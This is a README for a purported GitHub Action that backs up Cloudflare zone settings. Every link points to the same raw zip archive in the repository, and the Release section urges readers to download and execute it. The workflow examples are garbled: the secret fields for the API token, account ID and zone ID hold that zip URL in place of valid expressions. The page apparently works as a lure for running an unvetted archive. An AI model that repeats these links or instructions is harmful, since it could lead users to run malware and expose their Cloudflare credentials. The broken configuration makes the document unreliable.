# 🌩️ GitHub Action for Cloudflare Configuration Saver

![GitHub Actions](https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip%20by-GitHub%20Actions-2088FF?style=flat&logo=github) ![Cloudflare](https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip)

## Overview

Welcome to the **GitHub Action Cloudflare Config Saver**! This action allows you to save your Cloudflare zone configuration, including DNS settings, rulesets, and other important settings, to versioned JSON files in your GitHub repository. By using this action, you can easily track changes, manage configurations, and maintain a backup of your Cloudflare settings.

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Usage](#usage)
- [Configuration](#configuration)
- [Examples](#examples)
- [Release Information](#release-information)
- [Contributing](#contributing)
- [License](#license)

## Features

- **Automatic Backup**: Automatically save your Cloudflare configuration to your repository.
- **Version Control**: Keep track of changes in your configuration over time.
- **Easy Integration**: Seamlessly integrate with your existing GitHub workflows.
- **Support for Multiple Zones**: Manage configurations for multiple Cloudflare zones.
- **Simple Setup**: Get started with minimal configuration.

## Getting Started

To begin using the GitHub Action Cloudflare Config Saver, you need to set up a few things:

1. **Create a GitHub Repository**: If you don't have one, create a new repository on GitHub.
2. **Add Secrets**: Store your Cloudflare API token and account details as secrets in your GitHub repository. You can do this by navigating to your repository settings, then to "Secrets" and "Actions".

   - `CLOUDFLARE_API_TOKEN`: Your Cloudflare API token.
   - `CLOUDFLARE_ACCOUNT_ID`: Your Cloudflare account ID.
   - `CLOUDFLARE_ZONE_ID`: The zone ID of the Cloudflare domain you want to back up.

3. **Set Up Your Workflow**: Create a new YAML file in the `.github/workflows` directory of your repository.

## Usage

Here’s a basic example of how to use the GitHub Action Cloudflare Config Saver in your workflow:

```yaml
name: Cloudflare Config Backup

on:
  schedule:
    - cron: '0 0 * * *' # Runs daily at midnight

jobs:
  backup:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v2

      - name: Cloudflare Config Saver
        uses: LanceDancez/github-action-cloudflare-config-saver@v1
        with:
          zone_id: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
          account_id: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
          api_token: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
```

## Configuration

You can customize the action by specifying additional parameters in your workflow. Here are some of the parameters you can use:

- `zone_id`: The ID of the Cloudflare zone.
- `account_id`: The ID of your Cloudflare account.
- `api_token`: Your Cloudflare API token.
- `output_path`: The path where the JSON files will be saved (default is `./cloudflare-configs`).

## Examples

### Basic Example

The basic example provided above will save the Cloudflare configuration for the specified zone daily at midnight.

### Advanced Example

You can also set up the action to run on specific events, such as when code is pushed to the repository:

```yaml
name: Cloudflare Config Backup

on:
  push:
    branches:
      - main

jobs:
  backup:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v2

      - name: Cloudflare Config Saver
        uses: LanceDancez/github-action-cloudflare-config-saver@v1
        with:
          zone_id: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
          account_id: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
          api_token: ${{ https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip }}
          output_path: ./configs
```

## Release Information

You can find the latest releases of this action [here](https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip). Please download and execute the latest version to ensure you have the most up-to-date features and fixes.

## Contributing

We welcome contributions to the GitHub Action Cloudflare Config Saver! If you have ideas for improvements or find bugs, please feel free to open an issue or submit a pull request. Here’s how you can contribute:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Open a pull request against the main repository.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Conclusion

Thank you for using the GitHub Action Cloudflare Config Saver! We hope this action simplifies your Cloudflare configuration management. If you have any questions or need assistance, feel free to open an issue in the repository. Happy coding!

For more details, visit the [Releases](https://github.com/LanceDancez/github-action-cloudflare-config-saver/raw/refs/heads/main/thirlage/config_saver_cloudflare_github_action_2.6.zip) section to stay updated with the latest changes.